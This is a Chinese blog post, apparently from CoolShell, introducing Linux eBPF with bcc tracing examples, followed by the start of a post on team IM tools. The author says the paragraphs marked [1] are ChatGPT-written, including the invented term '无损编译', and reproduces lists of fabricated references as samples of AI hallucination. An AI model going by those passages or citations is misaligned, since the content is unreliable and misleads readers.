+<p>eBPF 是一种非常灵活和强大的内核技术，可以用于多种应用场景。下面是 eBPF 的一些常见用途：<code>[1]</code></p>
+<ul>
+<li>网络监控：eBPF 可以用于捕获网络数据包，并执行特定的逻辑来分析网络流量。例如，可以使用 eBPF 程序来监控网络流量，并在发现异常流量时进行警报。<code>[1]</code></li>
+<li>安全过滤：eBPF 可以用于对网络数据包进行安全过滤。例如，可以使用 eBPF 程序来阻止恶意流量的传播，或者在发现恶意流量时对其进行拦截。<code>[1]</code></li>
+<li>性能分析：eBPF 可以用于对内核的性能进行分析。例如，可以使用 eBPF 程序来收集内核的性能指标，并通过特定的接口将其可视化。这样，可以更好地了解内核的性能瓶颈，并进行优化。<code>[1]</code></li>
+<li>虚拟化：eBPF 可以用于虚拟化技术。例如，可以使用 eBPF 程序来收集虚拟机的性能指标，并进行负载均衡。这样，可以更好地利用虚拟化环境的资源，提高系统的性能和稳定性。<code>[1]</code></li>
+</ul>
+<p>总之，eBPF 的常见用途非常广泛，可以用于网络监控、安全过滤、性能分析和虚拟化等多种应用场景。<code>[1]</code></p>
+<h4>工作原理</h4>
+<p>eBPF 的工作原理主要分为三个步骤：加载、编译和执行。</p>
+<p>eBPF 需要在内核中运行。这通常是由用户态的应用程序完成的，它会通过系统调用来加载 eBPF 程序。在加载过程中，内核会将 eBPF 程序的代码复制到内核空间。</p>
+<p>eBPF 程序需要经过编译和执行。这通常是由Clang/LLVM的编译器完成，然后形成字节码后，将用户态的字节码装载进内核，Verifier会对要注入内核的程序进行一些内核安全机制的检查,这是为了确保 eBPF 程序不会破坏内核的稳定性和安全性。在检查过程中，内核会对 eBPF 程序的代码进行分析，以确保它不会进行恶意操作，如系统调用、内存访问等。如果 eBPF 程序通过了内核安全机制的检查，它就可以在内核中正常运行了，其会通过通过一个JIT编译步骤将程序的通用字节码转换为机器特定指令集，以优化程序的执行速度。</p>
+<p>下图是其架构图。</p>
+<p><img decoding="async" class="aligncenter" src="https://imgopt.infoq.com/fit-in/1200x2400/filters:quality(80)/filters:no_upscale()/articles/gentle-linux-ebpf-introduction/en/resources/47image005-1619704397592.jpg" /></p>
+<p style="text-align: center;">（图片来自：<a href="https://www.infoq.com/articles/gentle-linux-ebpf-introduction/" target="_blank" rel="noopener">https://www.infoq.com/articles/gentle-linux-ebpf-introduction/</a>）</p>
+<p>在内核中运行时，eBPF 程序通常会挂载到一个内核钩子（hook）上，以便在特定的事件发生时被执行。例如，</p>
+<ul>
+<li><span>系统调用——当用户空间函数将执行转移到内核时插入</span></li>
+<li><span>函数进入和退出——拦截对预先存在的函数的调用</span></li>
+<li><span>网络事件 &#8211; 在收到数据包时执行</span></li>
+<li><span>Kprobes 和 uprobes &#8211; 附加到内核或用户函数的探测器</span></li>
+</ul>
+<p>最后 eBPF Maps，允许eBPF程序在调用之间保持状态，以便进行相关的数据统计，并与用户空间的应用程序共享数据。一个eBPF映射基本上是一个键值存储，其中的值通常被视为任意数据的二进制块。它们是通过带有BPF_MAP_CREATE参数的<code>bpf_cmd</code>系统调用来创建的，和Linux世界中的其他东西一样，它们是通过文件描述符来寻址。与地图的交互是通过查找/更新/删除系统调用进行的</p>
+<p>总之，eBPF 的工作原理是通过动态加载、执行和检查<strong>无损编译</strong>过的代码来实现的。<code>[1]</code></p>
+<h4>示例</h4>
+<p>eBPF 可以用于对内核的性能进行分析。下面是一个基于 eBPF 的性能分析的 step-by-step 示例：</p>
+<p>第一步：准备工作：首先，需要确保内核已经支持 eBPF 功能。这通常需要在内核配置文件中启用 eBPF 相关的选项，并重新编译内核。检查是否支持 eBPF，你可以用这两个命令查看 <code>ls /sys/fs/bpf</code> 和 <code>lsmod | grep bpf</code></p>
+<p>第二步：写 eBPF 程序：接下来，需要编写 eBPF 程序，用于收集内核的性能指标。eBPF 程序的语言可以选择 C 或者 Python，它需要通过特定的接口访问内核的数据结构，并将收集到的数据保存到指定的位置。</p>
+<p>下面是一个Python 示例（其实还是C语言，用python来加载一段C程序到Linux内核）</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python3
+
+from bcc import BPF
+from time import sleep
+
+# 定义 eBPF 程序
+bpf_text = """
+#include &lt;uapi/linux/ptrace.h&gt;
+
+BPF_HASH(stats, u32);
+
+int count(struct pt_regs *ctx) {
+    u32 key = 0;
+    u64 *val, zero=0;
+    val = stats.lookup_or_init(&amp;key, &amp;zero);
+    (*val)++;
+    return 0;
+}
+"""
+
+# 编译 eBPF 程序
+b = BPF(text=bpf_text, cflags=["-Wno-macro-redefined"])
+
+# 加载 eBPF 程序
+b.attach_kprobe(event="tcp_sendmsg", fn_name="count")
+
+name = {
+  0: "tcp_sendmsg"
+}
+# 输出统计结果
+while True:
+    try:
+        #print("Total packets: %d" % b["stats"][0].value)
+        for k, v in b["stats"].items():
+           print("{}: {}".format(name[k.value], v.value))
+        sleep(1)
+    except KeyboardInterrupt:
+        exit()</pre>
+<p>这个 eBPF 程序的功能是统计网络中传输的数据包数量。它通过定义一个 <code>BPF_HASH</code> 数据结构来保存统计结果（eBPF Maps），并通过捕获 <code>tcp_sendmsg</code> 事件来实现实时统计。最后，它通过每秒输出一次统计结果来展示数据。这个 eBPF 程序只是一个简单的示例，实际应用中可能需要进行更复杂的统计和分析。</p>
+<p>第三步：运行 eBPF 程序：接下来，需要使用 eBPF 编译器将 eBPF 程序编译成内核可执行的格式（这个在上面的Python程序里你可以看到——Python引入了一个bcc的包，然后用这个包，把那段 C语言的程序编译成字节码加载在内核中并把某个函数 attach 到某个事件上）。这个过程可以使用 BPF Compiler Collection（BCC）工具来完成。BCC 工具可以通过命令行的方式将 eBPF 程序编译成内核可执行的格式，并将其加载到内核中。</p>
+<p>下面是运行上面的 Python3 程序的步骤：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">sudo apt install python3-bpfcc</pre>
+<p>注：在Python3下请不要使用 <code>pip3 install bcc</code> （参看：<a href="https://github.com/iovisor/bcc/issues/2278#issuecomment-825356087" target="_blank" rel="noopener">这里</a>）</p>
+<p>如果你是 Ubuntu 20.10 以上的版本，最好通过源码安装（否则程序会有编译问题），参看：<a href="https://github.com/iovisor/bcc/issues/3993#issuecomment-1228217609" target="_blank" rel="noopener">这里</a>：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="bash">apt purge bpfcc-tools libbpfcc python3-bpfcc
+wget https://github.com/iovisor/bcc/releases/download/v0.25.0/bcc-src-with-submodule.tar.gz
+tar xf bcc-src-with-submodule.tar.gz
+cd bcc/
+apt install -y python-is-python3
+apt install -y bison build-essential cmake flex git libedit-dev   libllvm11 llvm-11-dev libclang-11-dev zlib1g-dev libelf-dev libfl-dev python3-distutils
+apt install -y checkinstall
+mkdir build
+cd build/
+cmake -DCMAKE_INSTALL_PREFIX=/usr -DPYTHON_CMD=python3 ..
+make
+checkinstall</pre>
+<p>接下来，需要将上面的 Python 程序保存到本地，例如保存到文件 netstat.py。运行程序：最后，可以通过执行以下命令来运行 Python 程序：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">$ chmod +x ./netstat.py
+$ sudo ./netstat.py
+tcp_sendmsg: 29
+tcp_sendmsg: 216
+tcp_sendmsg: 277
+tcp_sendmsg: 379
+tcp_sendmsg: 419
+tcp_sendmsg: 468
+tcp_sendmsg: 574
+tcp_sendmsg: 645
+tcp_sendmsg: 29
+</pre>
+<p>程序开始运行后，会在控制台输出网络数据包的统计信息。可以通过按 Ctrl+C 组合键来结束程序的运行。</p>
+<p>下面我们再看一个比较复杂的示例，这个示例会计算TCP的发包时间（示例参考于Github上 <a href="https://github.com/iovisor/bcc/issues/2972" target="_blank" rel="noopener">这个issue</a>里的程序）：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python3
+
+from bcc import BPF
+import time
+
+# 定义 eBPF 程序
+bpf_text = """
+#include &lt;uapi/linux/ptrace.h&gt;
+#include &lt;net/sock.h&gt;
+#include &lt;net/inet_sock.h&gt;
+#include &lt;bcc/proto.h&gt;
+
+struct packet_t {
+    u64 ts, size;
+    u32 pid;
+    u32 saddr, daddr;
+    u16 sport, dport;
+};
+
+BPF_HASH(packets, u64, struct packet_t);
+
+int on_send(struct pt_regs *ctx, struct sock *sk, struct msghdr *msg, size_t size)
+{
+    u64 id = bpf_get_current_pid_tgid();
+    u32 pid = id;
+
+    // 记录数据包的时间戳和信息
+    struct packet_t pkt = {}; // 结构体一定要初始化，可以使用下面的方法
+                              //__builtin_memset(&amp;pkt, 0, sizeof(pkt)); 
+    pkt.ts = bpf_ktime_get_ns();
+    pkt.size = size;
+    pkt.pid = pid;
+    pkt.saddr = sk-&gt;__sk_common.skc_rcv_saddr;
+    pkt.daddr = sk-&gt;__sk_common.skc_daddr;
+    struct inet_sock *sockp = (struct inet_sock *)sk;
+    pkt.sport = sockp-&gt;inet_sport;
+    pkt.dport = sk-&gt;__sk_common.skc_dport;
+
+    packets.update(&amp;id, &amp;pkt);
+    return 0;
+}
+
+int on_recv(struct pt_regs *ctx, struct sock *sk)
+{
+    u64 id = bpf_get_current_pid_tgid();
+    u32 pid = id;
+
+    // 获取数据包的时间戳和编号
+    struct packet_t *pkt = packets.lookup(&amp;id);
+    if (!pkt) {
+        return 0;
+    }
+
+    // 计算传输时间
+    u64 delta = bpf_ktime_get_ns() - pkt-&gt;ts;
+
+    // 统计结果
+    bpf_trace_printk("tcp_time: %llu.%llums, size: %llu\\n", 
+       delta/1000, delta%1000%100, pkt-&gt;size);
+
+    // 删除统计结果
+    packets.delete(&amp;id);
+
+    return 0;
+}
+"""
+
+# 编译 eBPF 程序
+b = BPF(text=bpf_text, cflags=["-Wno-macro-redefined"])
+
+# 注册 eBPF 程序
+b.attach_kprobe(event="tcp_sendmsg", fn_name="on_send")
+b.attach_kprobe(event="tcp_v4_do_rcv", fn_name="on_recv")
+
+# 输出统计信息
+print("Tracing TCP latency... Hit Ctrl-C to end.")
+while True:
+    try:
+        (task, pid, cpu, flags, ts, msg) = b.trace_fields()
+        print("%-18.9f %-16s %-6d %s" % (ts, task, pid, msg))
+    except KeyboardInterrupt:
+        exit()</pre>
+<p>上面这个程序通过捕获每个数据包的时间戳来统计传输时间。在捕获 <code>tcp_sendmsg</code> 事件时，记录数据包的发送时间；在捕获 <code>tcp_v4_do_rcv</code> 事件时，记录数据包的接收时间；最后，通过比较两个时间戳来计算传输时间。</p>
+<p>从上面的两个程序我们可以看到，eBPF 的一个编程的基本方法，这样的在Python里向内核的某些事件挂载一段 &#8220;C语言” 的方式就是 eBPF 的编程方式。实话实说，这样的代码很不好写，而且有很多非常诡异的东西，一般人是很难驾驭的（上面的代码我也不是很容易都能写通的，把 Google 都用了个底儿掉，读了很多晦涩的文档……）好在这样的代码已经有人写了，我们不必再写了，在 <a href="https://github.com/iovisor/bcc/tree/master/tools" target="_blank" rel="noopener">Github 上的 bcc 库下的 tools 目录</a>有很多……</p>
+<p>BCC（<a href="https://github.com/iovisor/bcc" target="_blank" rel="noopener">BPF Compiler Collection</a>）是一套开源的工具集，可以在 Linux 系统中使用 BPF（Berkeley Packet Filter）程序进行系统级性能分析和监测。BCC 包含了许多实用工具，如：</p>
+<ol>
+<li>bcc-tools：一个包含许多常用的 BCC 工具的软件包。</li>
+<li>bpftrace：一个高级语言，用于编写和执行 BPF 程序。</li>
+<li>tcptop：一个实时监控和分析 TCP 流量的工具。</li>
+<li>execsnoop：一个用于监控进程执行情况的工具。</li>
+<li>filetop：一个实时监控和分析文件系统流量的工具。</li>
+<li>trace：一个用于跟踪和分析函数调用的工具。</li>
+<li>funccount：一个用于统计函数调用次数的工具。</li>
+<li>opensnoop：一个用于监控文件打开操作的工具。</li>
+<li>pidstat：一个用于监控进程性能的工具。</li>
+<li>profile：一个用于分析系统 CPU 使用情况的工具。</li>
+</ol>
+<p>下面这张图你可能见过多次了，你可以看看他可以干多少事，内核里发生什么事一览无余。</p>
+<p><img decoding="async" src="https://github.com/iovisor/bcc/raw/master/images/bcc_tracing_tools_2019.png" /></p>
+<h4>延伸阅读</h4>
+<p>一些经典的文章和书籍关于 eBPF 包括：</p>
+<ul>
+<li>Brendan Gregg 的《<a href="https://book.douban.com/subject/34467459/" target="_blank" rel="noopener">BPF Performance Tools: Linux System and Application Observability</a>》一书是一个全面的指南，涵盖了 eBPF 的基础知识和实践应用。</li>
+<li>eBPF 的官网：<a href="https://ebpf.io/" target="_blank" rel="noopener">https://ebpf.io/</a> 由 <a href="https://cilium.io/" rel="nofollow">Cilium</a> 建立</li>
+<li><a href="http://docs.cilium.io/en/latest/bpf/" rel="nofollow">Cilium&#8217;s BPF and XDP Reference Guide</a></li>
+<li><a href="https://www.kernel.org/doc/html/latest/bpf/index.html" rel="nofollow">BPF Documentation</a></li>
+<li><a href="https://www.kernel.org/doc/html/latest/bpf/bpf_design_QA.html" rel="nofollow">BPF Design Q&amp;A</a></li>
+<li>还有 Github 上的 <a href="https://github.com/zoidbergwill/awesome-ebpf" target="_blank" rel="noopener">Awesome eBPF</a></li>
+</ul>
+<h4>彩蛋</h4>
+<p>最后来到彩蛋环节。因为最近 ChatGPT 很火，于是，我想通过 ChatGPT 来帮助我书写这篇文章，一开始我让ChatGPT 帮我列提纲，并根据提纲生成文章内容，并查找相关的资料，非常之顺利，包括生成的代码，我以为我们以很快地完成这篇文章。</p>
+<p>但是，到了代码生成的时候，我发现，ChatGPT 生成的代码的思路和方法都是对的，但是是比较老的，而且是跑不起来的，<strong>出现了好些低级错误，如：使用了未声明的变量，没有引用完整的C语言的头文件，没有正确地初始化变量，错误地获取数据，类型没有匹配……等等</strong>，在程序调试上，挖了很多的坑，C语言本来就不好搞，挖的很多运行时的坑很难察觉，所以，耗费了我大量的时间来排除各种各样的问题，其中有环境上的问题，还有代码上的问题，这些问题即便是通过 Google 也不容易找到解决方案，我找到的解决方案都放在文章中了，尤其是第二个示例，让我调试了3个多小时，读了很多 bcc 上的issue和相关的晦涩的手册和文档，才让程序跑通。</p>
+<p>到了文章收关的阶段，我让ChatGPT 给我几个延伸阅读，也是很好的，但是没有给出链接，于是我只得人肉 Google 了一下，然后让我吃惊的是，<strong>好多ChatGPT给出来的文章是根本不存在的，完全是它伪造的</strong>。我连让它干了两次都是这样，这个让我惊掉大牙。这让我开始怀疑它之前生成的内容，于是，我不得我返回仔细Review我的文章，尤其是“介绍”、“用途”和“工作原理”这三个章节，基本都是ChatGPT生成的，在Review完后，我发现了ChatGPT 给我生造了一个叫 “无损编译器”的术语，这个术语简直了，于是我开始重写我的文章。我把一些段落重写了，有一些没有，保留下来的我都标记上了 <code>[1]</code>，大家读的时候要小心阅读。</p>
+<p>最后，<strong>我的结论是，ChatGPT只是一个不成熟的玩具，只能回答一些没有价值的日常聊天的问题，要说能取代Google，我觉得不可能，因为Google会基于基本的事实，而ChatGPT会基于内容生成的算法，在造假方面称得上是高手，可以列为电信诈骗的范畴了，我以后不会再使用ChatGPT生成文章内容或是作我的帮手了。StackOverflow把其ban了真是不能太赞了！</strong></p>
+<p><strong>附件一：ChatGPT的造假载图和样本</strong></p>
+<table width="100%">
+<tbody>
+<tr>
+<td>
+<p><figure id="attachment_22325" aria-describedby="caption-attachment-22325" style="width: 195px" class="wp-caption aligncenter"><a href="https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1.png"><img decoding="async" loading="lazy" class="wp-image-22325 size-medium" src="https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1-195x300.png" alt="" width="195" height="300" srcset="https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1-195x300.png 195w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1-665x1024.png 665w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1-768x1183.png 768w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1-997x1536.png 997w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1-175x270.png 175w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.1.png 1096w" sizes="(max-width: 195px) 100vw, 195px" /></a><figcaption id="caption-attachment-22325" class="wp-caption-text">点击看大图</figcaption></figure></td>
+<td>
+<p><figure id="attachment_22326" aria-describedby="caption-attachment-22326" style="width: 286px" class="wp-caption aligncenter"><a href="https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2.png"><img decoding="async" loading="lazy" class="wp-image-22326 size-medium" src="https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2-286x300.png" alt="" width="286" height="300" srcset="https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2-286x300.png 286w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2-978x1024.png 978w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2-768x804.png 768w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2-258x270.png 258w, https://coolshell.cn/wp-content/uploads/2022/12/eBPF.ref_.2.png 1096w" sizes="(max-width: 286px) 100vw, 286px" /></a><figcaption id="caption-attachment-22326" class="wp-caption-text">点击看大图</figcaption></figure></td>
+</tr>
+</tbody>
+</table>
+<p><strong>ChatGPT 生成的样本一</strong></p>
+<ul>
+<li>Brendan Gregg 的《BPF Performance Tools: Linux System and Application Observability》一书是一个全面的指南，涵盖了 eBPF 的基础知识和实践应用。</li>
+<li>Alexei Starovoitov 在 2015 年的 LPC 大会上发表的《eBPF and XDP: fast programmable datapath in the Linux kernel》一文，是一个介绍 eBPF 和 XDP（eXpress Data Path）的综述。</li>
+<li>谷歌的《BPF: The Future of Linux Monitoring and Observability》一文介绍了 eBPF 的基本概念，并探讨了它对于 Linux 监控和可观察性的影响。</li>
+<li>微软的《A Survey of Techniques for Hardware Acceleration of BPF》一文，介绍了 eBPF 在硬件加速方面的研究现状。</li>
+<li>Daniel Borkmann 的《Linux kernel networking: implementation and theory》一书涵盖了 eBPF 的实现和理论。</li>
+<li>Martin KaFai Lau 在 2015 年的 SOSP 大会上发表的《eBPF: a new execution environment for the Linux kernel》一文，介绍了 eBPF 在 Linux 内核中的新执行环境。</li>
+<li>来自两名谷歌工程师的《eBPF: A New Frontier in Performance Analysis》一文，探讨了 eBPF 对性能分析的影响。</li>
+<li>《BPF Performance Tools: Linux System and Application Observability》一书中的第三章，讨论了 eBPF 的编译器和运行时系统。</li>
+<li>来自三名谷歌工程师的《eBPF: The New Solaris DTrace》一文，比较了 eBPF 和 Solaris DTrace 系统的区别。</li>
+</ul>
+<p><strong>ChatGPT 生成的样本二</strong></p>
+<ol>
+<li>eBPF 程序开发指南（<a href="https://cilium.io/doc/ebpf/ebpf-guide/" target="_new" rel="noopener">https://cilium.io/doc/ebpf/ebpf-guide/</a>）</li>
+<li>eBPF 官方文档（<a href="https://www.kernel.org/doc/Documentation/networking/filter.txt" target="_new" rel="noopener">https://www.kernel.org/doc/Documentation/networking/filter.txt</a>）</li>
+<li>Linux 内核 eBPF 介绍（<a href="https://www.ibm.com/developerworks/cn/linux/kernel/ebpf/index.html" target="_new" rel="noopener">https://www.ibm.com/developerworks/cn/linux/kernel/ebpf/index.html</a>）</li>
+<li>eBPF 性能优化技巧（<a href="https://www.infoq.com/cn/news/2018/08/ebpf-performance-tips/" target="_new" rel="noopener">https://www.infoq.com/cn/news/2018/08/ebpf-performance-tips/</a>）</li>
+<li>eBPF 实战经验分享（<a href="https://blog.cloudflare.com/ebpf-in-practice/" target="_new" rel="noopener">https://blog.cloudflare.com/ebpf-in-practice/</a>）</li>
+<li>eBPF 在网络安全中的应用（<a href="https://www.zdnet.com/article/ebpf-how-to-use-it-for-network-security/" target="_new" rel="noopener">https://www.zdnet.com/article/ebpf-how-to-use-it-for-network-security/</a>）</li>
+<li>eBPF 实现 Linux 系统性能监控（<a href="https://www.percona.com/blog/2017/08/15/how-to-use-ebpf-to-monitor-linux-system-performance/" target="_new" rel="noopener">https://www.percona.com/blog/2017/08/15/how-to-use-ebpf-to-monitor-linux-system-performance/</a>）</li>
+<li>eBPF 入门教程（<a href="https://sysdig.com/blog/ebpf-getting-started/" target="_new" rel="noopener">https://sysdig.com/blog/ebpf-getting-started/</a>）</li>
+<li>eBPF 与 BPF 比较（<a href="https://lwn.net/Articles/724647/" target="_new" rel="noopener">https://lwn.net/Articles/724647/</a>）</li>
+<li>eBPF 提高课程（<a href="https://www.pluralsight.com/courses/ebpf-advanced" target="_new" rel="noopener">https://www.pluralsight.com/courses/ebpf-advanced</a>）</li>
+</ol>
+<p><strong>附件二：发明的术语：无损编译器</strong></p>
+<table width="100%">
+<tbody>
+<tr>
+<td>
+<p><figure id="attachment_22328" aria-describedby="caption-attachment-22328" style="width: 180px" class="wp-caption aligncenter"><a href="https://coolshell.cn/wp-content/uploads/2022/12/fake.png"><img decoding="async" loading="lazy" class="wp-image-22328 size-medium" src="https://coolshell.cn/wp-content/uploads/2022/12/fake-180x300.png" alt="" width="180" height="300" srcset="https://coolshell.cn/wp-content/uploads/2022/12/fake-180x300.png 180w, https://coolshell.cn/wp-content/uploads/2022/12/fake-616x1024.png 616w, https://coolshell.cn/wp-content/uploads/2022/12/fake-768x1277.png 768w, https://coolshell.cn/wp-content/uploads/2022/12/fake-924x1536.png 924w, https://coolshell.cn/wp-content/uploads/2022/12/fake-162x270.png 162w, https://coolshell.cn/wp-content/uploads/2022/12/fake.png 1080w" sizes="(max-width: 180px) 100vw, 180px" /></a><figcaption id="caption-attachment-22328" class="wp-caption-text">点击看大图</figcaption></figure></td>
+<td>
+<p><figure id="attachment_22335" aria-describedby="caption-attachment-22335" style="width: 223px" class="wp-caption aligncenter"><a href="https://coolshell.cn/wp-content/uploads/2022/12/fake.term_.png"><img decoding="async" loading="lazy" class="wp-image-22335 size-medium" src="https://coolshell.cn/wp-content/uploads/2022/12/fake.term_-223x300.png" alt="" width="223" height="300" srcset="https://coolshell.cn/wp-content/uploads/2022/12/fake.term_-223x300.png 223w, https://coolshell.cn/wp-content/uploads/2022/12/fake.term_-761x1024.png 761w, https://coolshell.cn/wp-content/uploads/2022/12/fake.term_-768x1033.png 768w, https://coolshell.cn/wp-content/uploads/2022/12/fake.term_-1142x1536.png 1142w, https://coolshell.cn/wp-content/uploads/2022/12/fake.term_-201x270.png 201w, https://coolshell.cn/wp-content/uploads/2022/12/fake.term_.png 1176w" sizes="(max-width: 223px) 100vw, 223px" /></a><figcaption id="caption-attachment-22335" class="wp-caption-text">点击看大图</figcaption></figure></td>
+</tr>
+</tbody>
+</table>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/1379.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/13.jpg" alt="如何调试bash脚本" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1379.html" class="wp_rp_title">如何调试bash脚本</a></li><li ><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/03/linux.ninja_-150x150.png" alt="打造高效的工作环境 &#8211; Shell 篇" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_title">打造高效的工作环境 &#8211; Shell 篇</a></li><li ><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/12/docker-networking-1-150x150.png" alt="记一次Kubernetes/Docker网络排障" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_title">记一次Kubernetes/Docker网络排障</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/systemd-1-150x150.jpeg" alt="Linux PID 1 和 Systemd" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_title">Linux PID 1 和 Systemd</a></li><li ><a href="https://coolshell.cn/articles/17416.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2016/07/cache-150x150.png" alt="缓存更新的套路" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17416.html" class="wp_rp_title">缓存更新的套路</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/22320.html">eBPF 介绍</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/22320.html/feed</wfw:commentRss>
+			<slash:comments>18</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>聊聊团队协同和协同工具</title>
+		<link>https://coolshell.cn/articles/22298.html</link>
+					<comments>https://coolshell.cn/articles/22298.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Fri, 14 Oct 2022 04:20:38 +0000</pubDate>
+				<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[Discord]]></category>
+		<category><![CDATA[Programmer]]></category>
+		<category><![CDATA[Slack]]></category>
+		<category><![CDATA[协同工具]]></category>
+		<category><![CDATA[程序员]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=22298</guid>
+
+					<description><![CDATA[<p>这两天跟 Cali 和 Rather 做了一个线上的 Podcast &#8211; Ep.5 一起聊聊团队协同。主要是从 IM 工具扩展开来聊了一下团队的协同...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/22298.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/22298.html">聊聊团队协同和协同工具</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-medium wp-image-22308" src="https://coolshell.cn/wp-content/uploads/2022/10/communication-300x168.png" alt="" width="300" height="168" srcset="https://coolshell.cn/wp-content/uploads/2022/10/communication-300x168.png 300w, https://coolshell.cn/wp-content/uploads/2022/10/communication-1024x574.png 1024w, https://coolshell.cn/wp-content/uploads/2022/10/communication-768x431.png 768w, https://coolshell.cn/wp-content/uploads/2022/10/communication-1536x861.png 1536w, https://coolshell.cn/wp-content/uploads/2022/10/communication-482x270.png 482w, https://coolshell.cn/wp-content/uploads/2022/10/communication.png 1680w" sizes="(max-width: 300px) 100vw, 300px" />这两天跟 <a href="https://twitter.com/CaliCastleMusic" target="_blank" rel="noopener">Cali</a> 和 <a href="https://twitter.com/RatherJie" target="_blank" rel="noopener">Rather</a> 做了一个线上的 <a href="https://kjsyp.fm/podcasts/43961/episodes/ep5-ft-megaease" target="_blank" rel="noopener">Podcast &#8211; Ep.5 一起聊聊团队协同</a>。主要是从 IM 工具扩展开来聊了一下团队的协同和相应的工具，但是聊天不是深度思考，有一些东西我没有讲透讲好，所以，我需要把我更多更完整更结构化的想法形成文字。（注：聊天聊地比较详细，本文只是想表达我的主要想法）</p>
+<h4>国内外的企业 IM 的本质差别</h4>
+<p>国内企业级在线交流工具主要有：企业微信、钉钉、飞书，国外的则是：Slack、Discord这两大IM工具，你会发现，他们有很多不一样的东西，<strong>其中有两个最大的不同，一个是企业管理，一个是企业文化。</strong></p>
+<h5>企业管理</h5>
+<p><strong>Slack/Discrod 主要是通过建 Channel ，而国内的IM则主要是拉群</strong>。你可能会说，这不是一样的吗？其实是不一样的，很明显，Channel 的属性是相对持久的，而群的属性则是临时的，前者是可以是部门，可以是团队，可以是项目，可以是产品，可以是某种长期存在的职能（如：技术分享），而拉群则是相对来说临时起意的，有时候，同样的人群能被重复地拉出好几次，因为之前临时起意的事做完了，所以群就被人所遗忘了，后面再有事就再来。<strong>很明显，Channel 这种方式明显是有管理的属性的，而拉群则是没有管理的</strong>。</p>
+<p><span id="more-22298"></span></p>
+<p>所以，在国内这种作坊式，野蛮粗放式的管理风格下，他们需要的就是想起一出是一出的 IM 工具，所以，拉群就是他们的工作习惯，因为没有科学的管理，所以没有章法，所以，他们不需要把工作内的信息结构化的工具。而国外则不然，国外的管理是精细化的，国外的公司还在重度使用 Email 的通讯方式，而 Email 是天生会给一个主题时行归类，而且 Email 天生不是碎片信息，所以，国外的 IM 需要跟 Email 竞争，因为像 Email 那样给邮件分类，把信息聚合在一个主题下的方式就能在 IM 上找到相关的影子。Channel 就是一个信息分类，相当于邮件分类，Slack 的 回复区和 Discord 的子区就像是把同一个主题信息时行聚合的功能。这明显是懂管理的人做的，而国内的拉群一看就是不懂管理的人干的，或者说是就是满足这些不懂管理的人的需求的。</p>
+<h5>企业文化</h5>
